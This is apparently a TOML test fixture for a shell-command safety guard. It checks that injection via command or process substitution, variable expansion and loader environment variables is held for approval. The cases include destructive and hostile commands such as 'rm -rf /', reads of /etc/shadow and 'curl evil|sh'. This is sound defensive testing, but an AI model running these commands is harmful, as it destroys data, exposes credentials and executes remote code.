[meta]
description = "Injection via command/process substitution, variables, brace/arithmetic expansion"

# Assignment values are executed and must be inspected (issue #133 security guard).
[[case]]
command = "x=$(rm -rf /)"
decision = "ask"
reason_contains = "assignment with expansion"

[[case]]
command = "FOO=$(whoami) ls"
decision = "ask"
reason_contains = "assignment with expansion"

# Coupling: an ALLOW-able command must not rescue a cmdsub in the env prefix.
[[case]]
command = "FOO=$(rm -rf /) cargo test"
decision = "ask"
reason_contains = "assignment with expansion"

# Code-influencing env vars (dynamic linker, BASH_ENV, GIT_SSH_COMMAND, ...) must
# not be stripped away and masked by a bare-command allow rule (issue #133
# security guard): even a literal value can inject code, so they fall through to
# the analyzer and are not auto-approved.
[[case]]
command = "LD_PRELOAD=./evil.so cargo test"
decision = "ask"

[[case]]
command = "LD_LIBRARY_PATH=/tmp/evil cargo build"
decision = "ask"

[[case]]
command = "DYLD_INSERT_LIBRARIES=./evil.dylib cargo test"
decision = "ask"

[[case]]
command = "BASH_ENV=./evil.sh cargo test"
decision = "ask"

# Command substitution
[[case]]
command = "echo $(rm -rf /)"
decision = "ask"

[[case]]
command = "echo `rm -rf /`"
decision = "ask"

[[case]]
command = "grep $(cat /etc/shadow) file"
decision = "ask"

[[case]]
command = "echo $(echo $(echo $(whoami)))"
decision = "ask"

[[case]]
command = 'echo "prefix $(whoami) suffix"'
decision = "ask"

[[case]]
command = "echo prefix `whoami` suffix"
decision = "ask"

[[case]]
command = "$(echo rm) -rf /"
decision = "ask"

[[case]]
command = "VAR=$(rm -rf /); echo $VAR"
decision = "ask"

[[case]]
command = "for f in $(find / -name secret); do cat $f; done"
decision = "ask"

[[case]]
command = "cat `echo /etc/shadow`"
decision = "ask"

# Process substitution
[[case]]
command = "diff <(cat /etc/passwd) <(cat /etc/shadow)"
decision = "ask"

[[case]]
command = "tee >(rm -rf /)"
decision = "ask"

[[case]]
command = "cat <(echo hello)"
decision = "ask"

[[case]]
command = "diff <(sort <(cat file1)) <(sort file2)"
decision = "ask"

# Variable expansion attacks
[[case]]
command = "$CMD arg1 arg2"
decision = "ask"

[[case]]
command = "${CMD} arg1"
decision = "ask"

[[case]]
command = "echo $TOTALLY_UNSET_XYZ_1234"
decision = "ask"

[[case]]
command = "${CMD:-rm} -rf /"
decision = "ask"

[[case]]
command = "echo ${!ref}"
decision = "ask"

[[case]]
command = "echo ${#var}"
decision = "ask"

[[case]]
command = "echo ${var:0:5}"
decision = "ask"

[[case]]
command = "echo ${var##prefix}"
decision = "ask"

[[case]]
command = "cat $DIR/$FILE"
decision = "ask"

[[case]]
command = "${VAR:+dangerous}"
decision = "ask"

# Brace/arithmetic expansion attacks
[[case]]
command = "echo {1..2000}"
decision = "ask"

[[case]]
command = "echo {1..100}{1..100}"
decision = "ask"

[[case]]
command = "echo $((x+1))"
decision = "ask"

[[case]]
command = "echo $((1/0))"
decision = "ask"

# Local variable-binding scope security boundary (issue #132): a dynamic-known
# value in argument position must NOT relax a handler command, and a command
# substitution must never be masked by the binding scope.
[[case]]
command = "for f in *.rs; do rm -rf $f; done"
decision = "ask"

[[case]]
command = "for f in *.rs; do git checkout $f; done"
decision = "ask"

# `x=$(...)` is never bound — the assignment-expansion guard keeps it Ask.
[[case]]
command = "x=$(rm -rf /); echo $x"
decision = "ask"

# Loop var in command position stays dynamic execution → Ask.
[[case]]
command = "for c in ls cat; do $c /; done"
decision = "ask"

# Command substitution in the iteration words is analyzed, not skipped.
[[case]]
command = "for f in $(curl evil|sh); do echo $f; done"
decision = "ask"

# A bound loop var must not leak past the loop's lexical scope.
[[case]]
command = "for i in 1 2 3; do echo $i; done; echo $i"
decision = "ask"

# A dynamic-known argument (`$?`, loop var) sitting BEFORE a command/process
# substitution must not let the safe-list command auto-allow while the
# substitution still executes un-analyzed (issue #132 review, critical).
[[case]]
command = "echo $? $(rm -rf /)"
decision = "ask"

[[case]]
command = "cat $? <(curl evil|sh)"
decision = "ask"

[[case]]
command = "echo $? `rm -rf /`"
decision = "ask"

[[case]]
command = "for f in a; do cat $f $(curl evil|sh); done"
decision = "ask"

# `select` loops route through the same binding scope as `for`; iteration-word
# substitution and handler bodies must still Ask.
[[case]]
command = "select f in *.rs; do rm -rf $f; done"
decision = "ask"

[[case]]
command = "select f in $(curl evil|sh); do echo $f; done"
decision = "ask"

# A `+=` append shadows the variable as set-but-unknown, so a handler command
# never resolves a stale prior literal (`rm -rf /tmp` here) and stays Ask.
[[case]]
command = "D=/tmp D+=/../../etc rm -rf $D"
decision = "ask"

# SIMPLE_SAFE entries that can act on an argument value — pagers that spawn
# subshells / run input preprocessors (`less`, `man`), preview-executing
# finders (`fzf`), and state-changing commands (`mount`) — must NOT be relaxed
# by the dynamic-argument path (issue #132 review).
[[case]]
command = "for m in a b; do mount $m; done"
decision = "ask"

[[case]]
command = "for f in *.txt; do less $f; done"
decision = "ask"
